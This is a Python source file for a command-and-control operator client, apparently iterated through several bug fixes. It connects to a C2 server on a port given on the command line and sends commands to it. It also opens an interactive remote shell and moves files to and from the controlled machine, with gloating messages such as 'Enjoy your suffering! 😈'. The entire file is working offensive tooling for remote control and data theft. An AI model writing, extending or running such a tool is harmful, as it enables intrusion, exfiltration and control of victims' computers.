import socket
import os
import struct
import sys

class C2Client:
    def __init__(self, host='127.0.0.1', port=4444):
        self.host = host
        self.port = port
        self.client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.client.connect((self.host, self.port))

        # --- Fix 3: Timeouts & Keep-Alive ---
        self.client.settimeout(30.0)
        self.client.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)

        print("[*] Connected to C2 Server. Enjoy your suffering! 😈")

    def send_command(self, command):
        self.client.send(command.encode())
        try:
            response = self.client.recv(4096).decode()
            print(response)
        except socket.timeout:
            print("[!] Timeout waiting for response.")
        return response

    def upload_file(self, file_path):
        # --- Fix 2: Pre-check file locally ---
        if not os.path.exists(file_path):
            print(f"[!] Error: File '{file_path}' not found.")
            return
        if not os.path.isfile(file_path):
            print(f"[!] Error: '{file_path}' is a directory.")
            return

        self.client.send(b"upload")
        # Wait for server to ask for file path
        self.client.recv(1024)
        self.client.send(file_path.encode())

        # Wait for READY from server
        ready = self.client.recv(1024)
        if b"READY" not in ready:
            print(f"[!] Server error: {ready.decode()}")
            return

        file_size = os.path.getsize(file_path)
        # Send size header (8 bytes, big‑endian)
        self.client.send(struct.pack('!Q', file_size))

        try:
            with open(file_path, 'rb') as f:
                sent = 0
                while sent < file_size:
                    data = f.read(4096)
                    if not data:
                        break
                    self.client.send(data)
                    sent += len(data)

            # Wait for final confirmation from server
            resp = self.client.recv(1024)
            print(resp.decode())
        except Exception as e:
            print(f"[!] Upload error: {str(e)}")

    def download_file(self, file_path):
        self.client.send(b"download")
        # Wait for server to ask for path
        self.client.recv(1024)
        self.client.send(file_path.encode())

        # --- Fix 2: Receive size header first ---
        size_data = self.client.recv(8)
        if len(size_data) < 8:
            print("[!] Error: Invalid size response.")
            return
        file_size = struct.unpack('!Q', size_data)[0]

        if file_size == 0:
            # Server sends an error message
            error_msg = self.client.recv(1024).decode()
            print(f"[!] Download failed: {error_msg}")
            return

        # --- Fix 2: Write with safe error handling ---
        try:
            # Prevent overwriting critical files (optional safety)
            if os.path.exists(file_path):
                print(f"[!] File '{file_path}' already exists. Skipping download.")
                return

            with open(file_path, 'wb') as f:
                received = 0
                while received < file_size:
                    chunk = self.client.recv(min(4096, file_size - received))
                    if not chunk:
                        break
                    f.write(chunk)
                    received += len(chunk)

            if received == file_size:
                print(f"[*] File '{file_path}' downloaded successfully. 😈")
            else:
                print(f"[!] Download incomplete. Got {received}/{file_size} bytes.")
                os.remove(file_path)  # clean up partial file
        except PermissionError:
            print("[!] Error: Permission denied writing file.")
        except Exception as e:
            print(f"[!] Error saving file: {str(e)}")

    def shell(self):
        self.client.send(b"shell")
        print("[*] Shell mode activated. Type 'exit' to quit. 🐍")
        while True:
            try:
                cmd = input("shell> ")
                if cmd.lower() == "exit":
                    self.client.send(b"exit")
                    break
                self.client.send(cmd.encode())
                output = self.client.recv(4096).decode()
                print(output)
            except socket.timeout:
                print("[!] Timeout – shell may be hung. Type 'exit' to return.")
            except KeyboardInterrupt:
                continue

if __name__ == "__main__":
    # --- Fix 1: Accept IP and port from command line ---
    host = sys.argv[1] if len(sys.argv) > 1 else '127.0.0.1'
    port = int(sys.argv[2]) if len(sys.argv) > 2 else 4444

    client = C2Client(host=host, port=port)

    while True:
        try:
            command = input("C2> ")
        except (KeyboardInterrupt, EOFError):
            break

        if command.lower() == "exit":
            client.send_command("exit")
            break

        elif command.lower() == "ping":   # --- Heartbeat ---
            client.send_command("ping")

        elif command.lower() == "shell":
            client.shell()

        elif command.lower().startswith("upload "):
            file_path = command.split(" ", 1)[1]
            client.upload_file(file_path)

        elif command.lower().startswith("download "):
            file_path = command.split(" ", 1)[1]
            client.download_file(file_path)

        elif command.lower() == "list":
            client.send_command("list")

        else:
            client.send_command(command)
